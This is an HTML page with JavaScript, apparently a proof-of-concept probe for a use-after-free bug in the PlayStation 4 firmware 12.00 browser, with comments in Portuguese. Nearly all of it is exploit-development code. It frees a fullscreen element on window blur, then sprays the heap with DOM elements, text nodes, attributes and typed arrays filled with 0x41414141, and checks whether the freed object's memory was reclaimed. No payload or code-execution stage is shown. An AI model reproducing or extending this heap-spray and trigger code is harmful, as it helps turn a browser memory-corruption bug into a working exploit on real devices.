<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Targeted Reclaim (Safe Log)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Targeted Reclaim (Safe Log)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO (CRÍTICO)
// ==========================
let logBuffer = [];

function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 TARGETED RECLAIM
// ==========================
function targetedReclaim() {
    log("[*] Targeted reclaim iniciado");

    let bucket = [];

    // 🔥 Fase 1 — churn pesado
    for (let i = 0; i < 8000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // 🔥 Fase 2 — REUSE DIRECIONADO (CRÍTICO)
    for (let i = 0; i < 12000; i++) {
        let el = document.createElement("div");

        el.innerHTML = "REUSE_EL_" + i;
        el.style.position = "absolute";
        el.style.width = "100%";
        el.style.height = "100%";

        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 Fase 3 — TypedArray spray (controle heap)
    for (let i = 0; i < 10000; i++) {
        let buf = new ArrayBuffer(0x100);
        let view = new Uint32Array(buf);
        view[0] = 0x41414141;
        bucket.push(view);
    }

    // 🔥 Fase 4 — TextNode
    for (let i = 0; i < 10000; i++) {
        let txt = document.createTextNode("TXT_" + i);
        document.body.appendChild(txt);
        bucket.push(txt);
    }

    // 🔥 Fase 5 — Attribute spray
    for (let i = 0; i < 10000; i++) {
        let el = document.createElement("div");
        el.setAttribute("data-x", "ATTR_" + i);
        document.body.appendChild(el);
        bucket.push(el);
    }

    log("[*] Targeted reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// 🔬 DETECÇÃO DE CORRUPÇÃO REAL
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK UAF ----");

    try {
        let html = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + html);

        if (html && html.includes("REUSE_EL_")) {
            log("[!!!] UAF DETECTADO (REUSE OVERWRITE)");
        }

    } catch(e) {
        log("[UAF] innerHTML erro");
    }

    try {
        let attr = fsTarget.getAttribute("data-x");
        log("[CHECK] data-x = " + attr);

        if (attr && attr.includes("ATTR_")) {
            log("[!!!] UAF DETECTADO (ATTR OVERWRITE)");
        }

    } catch(e) {
        log("[UAF] attribute erro");
    }

    try {
        let node = fsTarget.firstChild;
        log("[CHECK] firstChild = " + node);

        if (node && node.textContent && node.textContent.includes("TXT_")) {
            log("[!!!] UAF DETECTADO (TEXTNODE OVERWRITE)");
        }

    } catch(e) {
        log("[UAF] firstChild erro");
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    // 🔥 janela crítica — múltiplos reclaims
    setTimeout(() => targetedReclaim(), 0);
    setTimeout(() => targetedReclaim(), 50);
    setTimeout(() => targetedReclaim(), 100);

    // 🔬 checks progressivos
    setTimeout(() => checkUAF(fsTarget), 10);
    setTimeout(() => checkUAF(fsTarget), 30);
    setTimeout(() => checkUAF(fsTarget), 60);
    setTimeout(() => checkUAF(fsTarget), 120);
    setTimeout(() => checkUAF(fsTarget), 250);

    // 🔒 dump seguro (CRÍTICO)
    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    // 🔁 comportamento original
    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {
    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");

        // ⚠️ timing crítico preservado
        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
